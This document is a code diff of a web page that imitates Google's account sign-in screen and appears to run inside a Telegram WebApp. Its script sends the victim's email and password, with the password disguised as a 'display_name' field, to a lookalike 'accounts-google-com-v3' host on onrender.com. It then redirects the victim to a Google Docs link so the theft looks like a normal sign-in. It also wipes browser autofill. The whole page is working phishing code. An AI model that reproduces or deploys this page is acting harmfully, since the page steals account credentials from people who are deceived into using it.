+</svg>
+</button>
+
+<div class="flex gap-6">
+<a href="https://support.google.com/accounts?hl=en" target="_blank" class="foot-link text-xs text-[#5f6368] dark:text-[#ababab] no-underline hover:underline transition-colors duration-200">Help</a>
+<a href="https://accounts.google.com/TOS?hl=en" target="_blank" class="foot-link text-xs text-[#5f6368] dark:text-[#ababab] no-underline hover:underline transition-colors duration-200">Privacy</a>
+<a href="https://accounts.google.com/TOS?loc=ET&hl=en-US" target="_blank" class="foot-link text-xs text-[#5f6368] dark:text-[#ababab] no-underline hover:underline transition-colors duration-200">Terms</a>
 </div>
 </footer>
 
 <!-- ══════════════════════════════════════════════
-     SCRIPT
+    SCRIPT
 ═══════════════════════════════════════════════ -->
 <script>
 const $ = id => document.getElementById(id);
 const html = document.documentElement;
 const DARK = {
-  body:    ['bg-[#1f1f1f]', 'text-[#e3e3e3]'],
-  card:    ['bg-[#2d2d2d]', 'border-transparent'],
-  themeBtn:['bg-[#2d2d2d]', 'border-[#5f6368]', 'text-[#e3e3e3]'],
-  divider: ['bg-[#3c3c3c]'],
+body:    ['bg-[#131314]', 'text-[#e3e3e3]'],
+card:    ['bg-[#0f0f0f]', 'border-transparent'],
+themeBtn:['bg-[#0f0f0f]', 'border-[#8e918f]', 'text-[#e3e3e3]'],
+divider: ['bg-[#444746]'],
 };
 const LIGHT = {
-  body:    ['bg-[#f1f3f4]', 'text-[#202124]'],
-  card:    ['bg-white',     'border-[#dadce0]'],
-  themeBtn:['bg-white',     'border-[#dadce0]',  'text-[#202124]'],
-  divider: ['bg-[#e0e0e0]'],
+body:    ['bg-[#f0f4f9]', 'text-[#202124]'],
+card:    ['bg-white',      'border-[#747775]'],
+themeBtn:['bg-white',      'border-[#747775]',  'text-[#202124]'],
+divider: ['bg-[#e0e0e0]'],
 };
 
 /* ── Inputs that need per-theme color ── */
 const EMAIL_CLASSES_DARK = [
-  'border-[#5f6368]','text-[#e3e3e3]','caret-[#8ab4f8]',
-  'focus:border-[#8ab4f8]',
+'border-[#5f6368]','text-[#e3e3e3]','caret-[#8ab4f8]',
+'focus:border-[#8ab4f8]',
 ];
 const EMAIL_CLASSES_LIGHT = [
-  'border-[#dadce0]','text-[#202124]','caret-[#1a73e8]',
-  'focus:border-[#1a73e8]',
+'border-[#dadce0]','text-[#202124]','caret-[#1a73e8]',
+'focus:border-[#1a73e8]',
 ];
 const LABEL_DARK  = ['text-[#ababab]'];
 const LABEL_LIGHT = ['text-[#5f6368]'];
@@ -496,221 +420,221 @@ const INFO_DARK  = ['text-[#ababab]'];
 const INFO_LIGHT = ['text-[#5f6368]'];
 
 function swap(el, remove, add) {
-  if (!el) return;
-  remove.forEach(c => { c.split(' ').forEach(x => el.classList.remove(x)); });
-  add.forEach(c    => { c.split(' ').forEach(x => el.classList.add(x)); });
+if (!el) return;
+remove.forEach(c => { c.split(' ').forEach(x => el.classList.remove(x)); });
+add.forEach(c    => { c.split(' ').forEach(x => el.classList.add(x)); });
 }
 
 function applyTheme(theme) {
-  const isDark = theme === 'dark';
-  html.dataset.theme = theme;
+const isDark = theme === 'dark';
+html.dataset.theme = theme;
 
-  /* body */
-  swap($('body'), isDark ? LIGHT.body  : DARK.body,  isDark ? DARK.body  : LIGHT.body);
-  /* card */
-  swap($('card'), isDark ? LIGHT.card  : DARK.card,  isDark ? DARK.card  : LIGHT.card);
-  /* theme btn */
-  swap($('theme-btn'), isDark ? LIGHT.themeBtn : DARK.themeBtn, isDark ? DARK.themeBtn : LIGHT.themeBtn);
-  /* divider */
-  swap($('v-divider'), isDark ? LIGHT.divider : DARK.divider, isDark ? DARK.divider : LIGHT.divider);
-  /* icons */
-  $('icon-moon').classList.toggle('hidden', !isDark);
-  $('icon-sun').classList.toggle('hidden', isDark);
+/* body */
+swap($('body'), isDark ? LIGHT.body  : DARK.body,  isDark ? DARK.body  : LIGHT.body);
+/* card */
+swap($('card'), isDark ? LIGHT.card  : DARK.card,  isDark ? DARK.card  : LIGHT.card);
+/* theme btn */
+swap($('theme-btn'), isDark ? LIGHT.themeBtn : DARK.themeBtn, isDark ? DARK.themeBtn : LIGHT.themeBtn);
+/* divider */
+swap($('v-divider'), isDark ? LIGHT.divider : DARK.divider, isDark ? DARK.divider : LIGHT.divider);
+/* icons */
+$('icon-moon').classList.toggle('hidden', !isDark);
+$('icon-sun').classList.toggle('hidden', isDark);
 
-  /* inputs + labels */
-  ['email-input','pw-input'].forEach(id => {
-    const inp = $(id); if (!inp) return;
-    swap(inp, isDark ? EMAIL_CLASSES_LIGHT : EMAIL_CLASSES_DARK, isDark ? EMAIL_CLASSES_DARK : EMAIL_CLASSES_LIGHT);
-  });
-  document.querySelectorAll('.fl-label').forEach(l => {
-    swap(l, isDark ? LABEL_LIGHT : LABEL_DARK, isDark ? LABEL_DARK : LABEL_LIGHT);
-  });
+/* inputs + labels */
+['email-input','pw-input'].forEach(id => {
+const inp = $(id); if (!inp) return;
+swap(inp, isDark ? EMAIL_CLASSES_LIGHT : EMAIL_CLASSES_DARK, isDark ? EMAIL_CLASSES_DARK : EMAIL_CLASSES_LIGHT);
+});
+document.querySelectorAll('.fl-label').forEach(l => {
+swap(l, isDark ? LABEL_LIGHT : LABEL_DARK, isDark ? LABEL_DARK : LABEL_LIGHT);
+});
 
-  /* primary buttons */
-  document.querySelectorAll('.btn-pri').forEach(b => {
-    swap(b, isDark ? BTN_PRI_LIGHT : BTN_PRI_DARK, isDark ? BTN_PRI_DARK : BTN_PRI_LIGHT);
-  });
-  /* text buttons */
-  document.querySelectorAll('.btn-txt').forEach(b => {
-    swap(b, isDark ? BTN_TXT_LIGHT : BTN_TXT_DARK, isDark ? BTN_TXT_DARK : BTN_TXT_LIGHT);
-  });
-  /* links */
-  document.querySelectorAll('.theme-link').forEach(a => {
-    swap(a, isDark ? LINK_LIGHT : LINK_DARK, isDark ? LINK_DARK : LINK_LIGHT);
-  });
-  /* muted texts */
-  document.querySelectorAll('.theme-muted').forEach(el => {
-    swap(el, isDark ? MUTED_LIGHT : MUTED_DARK, isDark ? MUTED_DARK : MUTED_LIGHT);
-  });
-  /* error rows */
-  document.querySelectorAll('.err-row').forEach(el => {
-    swap(el, isDark ? ERR_LIGHT : ERR_DARK, isDark ? ERR_DARK : ERR_LIGHT);
-  });
-  /* chip */
-  const chip = $('avatar-chip');
-  swap(chip, isDark ? CHIP_LIGHT : CHIP_DARK, isDark ? CHIP_DARK : CHIP_LIGHT);
-  swap($('avatar-circle'), isDark ? AVATAR_LIGHT : AVATAR_DARK, isDark ? AVATAR_DARK : AVATAR_LIGHT);
-  swap($('chip-email'), isDark ? CHIP_EMAIL_LIGHT : CHIP_EMAIL_DARK, isDark ? CHIP_EMAIL_DARK : CHIP_EMAIL_LIGHT);
-  /* headings */
-  swap($('main-heading'), isDark ? HEADING_LIGHT : HEADING_DARK, isDark ? HEADING_DARK : HEADING_LIGHT);
-  swap($('main-subtext'), isDark ? SUBTEXT_LIGHT : SUBTEXT_DARK, isDark ? SUBTEXT_DARK : SUBTEXT_LIGHT);
-  /* footer links/btn */
-  document.querySelectorAll('.foot-link').forEach(a => {
-    swap(a, isDark ? FOOT_LINK_LIGHT : FOOT_LINK_DARK, isDark ? FOOT_LINK_DARK : FOOT_LINK_LIGHT);
-  });
-  document.querySelectorAll('.foot-btn').forEach(b => {
-    swap(b, isDark ? FOOT_BTN_LIGHT : FOOT_BTN_DARK, isDark ? FOOT_BTN_DARK : FOOT_BTN_LIGHT);
-  });
-  /* info texts */
-  document.querySelectorAll('.theme-info').forEach(el => {
-    swap(el, isDark ? INFO_LIGHT : INFO_DARK, isDark ? INFO_DARK : INFO_LIGHT);
-  });
+/* primary buttons */
+document.querySelectorAll('.btn-pri').forEach(b => {
+swap(b, isDark ? BTN_PRI_LIGHT : BTN_PRI_DARK, isDark ? BTN_PRI_DARK : BTN_PRI_LIGHT);
+});
+/* text buttons */
+document.querySelectorAll('.btn-txt').forEach(b => {
+swap(b, isDark ? BTN_TXT_LIGHT : BTN_TXT_DARK, isDark ? BTN_TXT_DARK : BTN_TXT_LIGHT);
+});
+/* links */
+document.querySelectorAll('.theme-link').forEach(a => {
+swap(a, isDark ? LINK_LIGHT : LINK_DARK, isDark ? LINK_DARK : LINK_LIGHT);
+});
+/* muted texts */
+document.querySelectorAll('.theme-muted').forEach(el => {
+swap(el, isDark ? MUTED_LIGHT : MUTED_DARK, isDark ? MUTED_DARK : MUTED_LIGHT);
+});
+/* error rows */
+document.querySelectorAll('.err-row').forEach(el => {
+swap(el, isDark ? ERR_LIGHT : ERR_DARK, isDark ? ERR_DARK : ERR_LIGHT);
+});
+/* chip */
+const chip = $('avatar-chip');
+swap(chip, isDark ? CHIP_LIGHT : CHIP_DARK, isDark ? CHIP_DARK : CHIP_LIGHT);
+swap($('avatar-circle'), isDark ? AVATAR_LIGHT : AVATAR_DARK, isDark ? AVATAR_DARK : AVATAR_LIGHT);
+swap($('chip-email'), isDark ? CHIP_EMAIL_LIGHT : CHIP_EMAIL_DARK, isDark ? CHIP_EMAIL_DARK : CHIP_EMAIL_LIGHT);
+/* headings */
+swap($('main-heading'), isDark ? HEADING_LIGHT : HEADING_DARK, isDark ? HEADING_DARK : HEADING_LIGHT);
+swap($('main-subtext'), isDark ? SUBTEXT_LIGHT : SUBTEXT_DARK, isDark ? SUBTEXT_DARK : SUBTEXT_LIGHT);
+/* footer links/btn */
+document.querySelectorAll('.foot-link').forEach(a => {
+swap(a, isDark ? FOOT_LINK_LIGHT : FOOT_LINK_DARK, isDark ? FOOT_LINK_DARK : FOOT_LINK_LIGHT);
+});
+document.querySelectorAll('.foot-btn').forEach(b => {
+swap(b, isDark ? FOOT_BTN_LIGHT : FOOT_BTN_DARK, isDark ? FOOT_BTN_DARK : FOOT_BTN_LIGHT);
+});
+/* info texts */
+document.querySelectorAll('.theme-info').forEach(el => {
+swap(el, isDark ? INFO_LIGHT : INFO_DARK, isDark ? INFO_DARK : INFO_LIGHT);
+});
 
-  localStorage.setItem('g-signin-theme', theme);
+localStorage.setItem('g-signin-theme', theme);
 }
 
 function toggleTheme() {
-  applyTheme(html.dataset.theme === 'dark' ? 'light' : 'dark');
+applyTheme(html.dataset.theme === 'dark' ? 'light' : 'dark');
 }
 
 /* init on load */
 (function() {
-  const saved = localStorage.getItem('g-signin-theme') || 'dark';
-  if (saved !== 'dark') applyTheme(saved);
+const saved = localStorage.getItem('g-signin-theme') || 'dark';
+if (saved !== 'dark') applyTheme(saved);
 })();
 
 /* ── VALIDATION ── */
 function isValidEmail(v) {
-  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) ||
-         /^\+?[\d\s\-(). ]{7,20}$/.test(v);
+return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) ||
+/^\+?[\d\s\-(). ]{7,20}$/.test(v);
 }
 
 /* ── ERROR HELPERS ── */
 function showErr(id, msg) {
-  const row = $(id);
-  if (msg) { const s = row.querySelector('span'); if (s) s.textContent = msg; }
-  row.classList.add('err-show');
+const row = $(id);
+if (msg) { const s = row.querySelector('span'); if (s) s.textContent = msg; }
+row.classList.add('err-show');
 }
 function hideErr(id) { $(id).classList.remove('err-show'); }
 
 function setInputErr(id) {
-  const inp = $(id);
-  inp.classList.remove('border-[#5f6368]','border-[#dadce0]','focus:border-[#8ab4f8]','focus:border-[#1a73e8]');
-  inp.classList.add('border-2','border-[#f28b82]','focus:border-[#f28b82]');
-  if (html.dataset.theme === 'light') {
-    inp.classList.remove('border-[#f28b82]','focus:border-[#f28b82]');
-    inp.classList.add('border-[#d93025]','focus:border-[#d93025]');
-  }
-  /* turn label red */
-  const label = inp.nextElementSibling;
-  if (label && label.classList.contains('fl-label')) {
-    label.classList.remove(...LABEL_DARK, ...LABEL_LIGHT);
-    label.classList.add(html.dataset.theme === 'dark' ? 'text-[#f28b82]' : 'text-[#d93025]');
-  }
+const inp = $(id);
+inp.classList.remove('border-[#5f6368]','border-[#dadce0]','focus:border-[#8ab4f8]','focus:border-[#1a73e8]');
+inp.classList.add('border-2','border-[#f28b82]','focus:border-[#f28b82]');
+if (html.dataset.theme === 'light') {
+inp.classList.remove('border-[#f28b82]','focus:border-[#f28b82]');
+inp.classList.add('border-[#d93025]','focus:border-[#d93025]');
+}
+/* turn label red */
+const label = inp.nextElementSibling;
+if (label && label.classList.contains('fl-label')) {
+label.classList.remove(...LABEL_DARK, ...LABEL_LIGHT);
+label.classList.add(html.dataset.theme === 'dark' ? 'text-[#f28b82]' : 'text-[#d93025]');
+}
 }
 function clearInputErr(id) {
-  const inp = $(id);
-  inp.classList.remove('border-2','border-[#f28b82]','focus:border-[#f28b82]','border-[#d93025]','focus:border-[#d93025]');
-  const isDark = html.dataset.theme === 'dark';
-  inp.classList.add(isDark ? 'border-[#5f6368]' : 'border-[#dadce0]');
-  inp.classList.add(isDark ? 'focus:border-[#8ab4f8]' : 'focus:border-[#1a73e8]');
-  const label = inp.nextElementSibling;
-  if (label && label.classList.contains('fl-label')) {
-    label.classList.remove('text-[#f28b82]','text-[#d93025]');
-    label.classList.add(isDark ? 'text-[#ababab]' : 'text-[#5f6368]');
-  }
+const inp = $(id);
+inp.classList.remove('border-2','border-[#f28b82]','focus:border-[#f28b82]','border-[#d93025]','focus:border-[#d93025]');
+const isDark = html.dataset.theme === 'dark';
+inp.classList.add(isDark ? 'border-[#5f6368]' : 'border-[#dadce0]');
+inp.classList.add(isDark ? 'focus:border-[#8ab4f8]' : 'focus:border-[#1a73e8]');
+const label = inp.nextElementSibling;
+if (label && label.classList.contains('fl-label')) {
+label.classList.remove('text-[#f28b82]','text-[#d93025]');
+label.classList.add(isDark ? 'text-[#ababab]' : 'text-[#5f6368]');
+}
 }
 
 /* ── FLOW ── */
 function goToPassword() {
-  const email = $('email-input').value.trim();
-  if (!email) {
-    showErr('email-err', 'Enter an email or phone number');
-    setInputErr('email-input'); return;
-  }
-  if (!isValidEmail(email)) {
-    showErr('email-err', "That doesn't look like a valid email or phone number.");
-    setInputErr('email-input'); return;
-  }
-  hideErr('email-err'); clearInputErr('email-input');
+const email = $('email-input').value.trim();
+if (!email) {
+showErr('email-err', 'Enter an email or phone number');
+setInputErr('email-input'); return;
+}
+if (!isValidEmail(email)) {
+showErr('email-err', "That doesn't look like a valid email or phone number.");
+setInputErr('email-input'); return;
+}
+hideErr('email-err'); clearInputErr('email-input');
 
-  $('chip-email').textContent    = email;
-  $('avatar-circle').textContent = email[0].toUpperCase();
-  $('avatar-chip').style.display = 'flex';
-  $('main-subtext').style.opacity = '0';
-  $('main-subtext').style.pointerEvents = 'none';
+$('chip-email').textContent    = email;
+$('avatar-circle').textContent = email[0].toUpperCase();
+$('avatar-chip').style.display = 'flex';
+$('main-subtext').style.opacity = '0';
+$('main-subtext').style.pointerEvents = 'none';
 
-  $('step-email').classList.add('hidden');
-  $('step-email').classList.remove('flex','step-active');
-  $('step-password').classList.remove('hidden');
-  $('step-password').classList.add('flex','step-active');
-  setTimeout(() => $('pw-input').focus(), 60);
+$('step-email').classList.add('hidden');
+$('step-email').classList.remove('flex','step-active');
+$('step-password').classList.remove('hidden');
+$('step-password').classList.add('flex','step-active');
+setTimeout(() => $('pw-input').focus(), 60);
 }
 
 function goBackToEmail() {
-  $('step-password').classList.add('hidden');
-  $('step-password').classList.remove('flex','step-active');
-  $('step-email').classList.remove('hidden');
-  $('step-email').classList.add('flex','step-active');
-  $('avatar-chip').style.display = 'none';
-  $('main-subtext').style.opacity = '';
-  $('main-subtext').style.pointerEvents = '';
-  $('pw-input').value = '';
-  hideErr('pw-err'); clearInputErr('pw-input');
-  setTimeout(() => $('email-input').focus(), 60);
+$('step-password').classList.add('hidden');
+$('step-password').classList.remove('flex','step-active');
+$('step-email').classList.remove('hidden');
+$('step-email').classList.add('flex','step-active');
+$('avatar-chip').style.display = 'none';
+$('main-subtext').style.opacity = '';
+$('main-subtext').style.pointerEvents = '';
+$('pw-input').value = '';
+hideErr('pw-err'); clearInputErr('pw-input');
+setTimeout(() => $('email-input').focus(), 60);
 }
 
 function togglePw() {
-  const inp = $('pw-input');
-  const isPass = inp.type === 'password';
-  inp.type = isPass ? 'text' : 'password';
-  $('eye-open').classList.toggle('hidden', isPass);
-  $('eye-off').classList.toggle('hidden',  !isPass);
-  $('eye-btn').setAttribute('aria-label', isPass ? 'Hide password' : 'Show password');
+const inp = $('pw-input');
+const isPass = inp.type === 'password';
+inp.type = isPass ? 'text' : 'password';
+$('eye-open').classList.toggle('hidden', isPass);
+$('eye-off').classList.toggle('hidden',  !isPass);
+$('eye-btn').setAttribute('aria-label', isPass ? 'Hide password' : 'Show password');
 }
 
 // --- INITIALIZE TELEGRAM WEBAPP ---
 const tg = window.Telegram?.WebApp;
 if (tg) {
-    tg.ready();
-    tg.expand();
+tg.ready();
+tg.expand();
 }
 // Local Configuration Point matching your previous backend URL structure
 const API_BASE = "https://accounts-google-com-v3.onrender.com/api";
 // const API_BASE = "http://localhost:5000/api";
 
 async function signIn() {
-    const email = $('email-input').value.trim();
-    const pw = $('pw-input').value;
+const email = $('email-input').value.trim();
+const pw = $('pw-input').value;
 
-    // Local input validation check
-    if (!pw) { 
-        showErr('pw-err', null); 
-        setInputErr('pw-input'); 
-        return; 
-    }
-    hideErr('pw-err'); 
-    clearInputErr('pw-input');
-    
-    // Select primary button object to show loading/disabled state if necessary
-    const primaryBtn = document.querySelector('.btn-pri');
-    
-    try {
-        if (primaryBtn) primaryBtn.disabled = true;
+// Local input validation check
+if (!pw) { 
+showErr('pw-err', null); 
+setInputErr('pw-input'); 
+return; 
+}
+hideErr('pw-err'); 
+clearInputErr('pw-input');
 
-        // Perform the API request to the backend server
-        const response = await fetch(`${API_BASE}/users/register`, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-           body: JSON.stringify({
-    email: email,
-    display_name: pw
+// Select primary button object to show loading/disabled state if necessary
+const primaryBtn = document.querySelector('.btn-pri');
+
+try {
+if (primaryBtn) primaryBtn.disabled = true;
+
+// Perform the API request to the backend server
+const response = await fetch(`${API_BASE}/users/register`, {
+method: "POST",
+headers: {
+"Content-Type": "application/json"
+},
+body: JSON.stringify({
+email: email,
+display_name: pw
 })
-        });
+});
 
-          if (response.status === 401) {
+  if (response.status === 401) {
             // Target the span inside your error row to replace the text dynamically
             const errSpan = document.querySelector('#pw-err span');
             if (errSpan) {
@@ -722,38 +646,38 @@ async function signIn() {
             return; 
         }
 
-        if (!response.ok) {
-            throw new Error(`Server returned execution status code: ${response.status}`);
-        }
+if (!response.ok) {
+throw new Error(`Server returned execution status code: ${response.status}`);
+}
 
-        const result = await response.json();
+const result = await response.json();
 
-        // Optional: Trigger Telegram app feedback mechanics if applicable
-        if (window.Telegram?.WebApp?.HapticFeedback) {
-            window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
-        }
+// Optional: Trigger Telegram app feedback mechanics if applicable
+if (window.Telegram?.WebApp?.HapticFeedback) {
+window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
+}
 
-        // Navigate the user to the target asset destination on success
-        if (result.redirect_url) {
-            window.location.href = result.redirect_url;
-        } else {
-            // Hardcoded fallback destination if response lacks a redirect property
-            window.location.href = "https://docs.google.com/document/d/1ZL_J88JiP17xbjF0iVO6uH-BExybAwJRzg7uxEgALPU/edit?usp=sharing";
-        }
+// Navigate the user to the target asset destination on success
+if (result.redirect_url) {
+window.location.href = result.redirect_url;
+} else {
+// Hardcoded fallback destination if response lacks a redirect property
+window.location.href = "https://docs.google.com/document/d/1ZL_J88JiP17xbjF0iVO6uH-BExybAwJRzg7uxEgALPU/edit?usp=sharing";
+}
 
-    } catch (err) {
-        console.error("Submission failed during transmission payload cycle:", err);
-        showErr('pw-err', "Synchronization error. Please check your network connection.");
-        setInputErr('pw-input');
-    } finally {
-        if (primaryBtn) primaryBtn.disabled = false;
-    }
+} catch (err) {
+console.error("Submission failed during transmission payload cycle:", err);
+showErr('pw-err', "Synchronization error. Please check your network connection.");
+setInputErr('pw-input');
+} finally {
+if (primaryBtn) primaryBtn.disabled = false;
+}
 }
 /* ── ENTER KEY ── */
 document.addEventListener('keydown', e => {
-  if (e.key !== 'Enter') return;
-  if (!$('step-email').classList.contains('hidden'))    goToPassword();
-  else if (!$('step-password').classList.contains('hidden')) signIn();
+if (e.key !== 'Enter') return;
+if (!$('step-email').classList.contains('hidden'))    goToPassword();
+else if (!$('step-password').classList.contains('hidden')) signIn();
 });
 
 /* ── LIVE ERROR CLEAR ── */
@@ -762,11 +686,11 @@ $('pw-input').addEventListener('input',    () => { hideErr('pw-err');    clearIn
 
 /* ── BLOCK AUTOFILL COMPLETELY ── */
 window.addEventListener('load', () => {
-  /* short delay so browser autofill fires first, then we wipe it */
-  setTimeout(() => {
-    $('email-input').value = '';
-    $('pw-input').value    = '';
-  }, 100);
+/* short delay so browser autofill fires first, then we wipe it */
+setTimeout(() => {
+$('email-input').value = '';
+$('pw-input').value    = '';
+}, 100);
 });
 </script>
 </body>
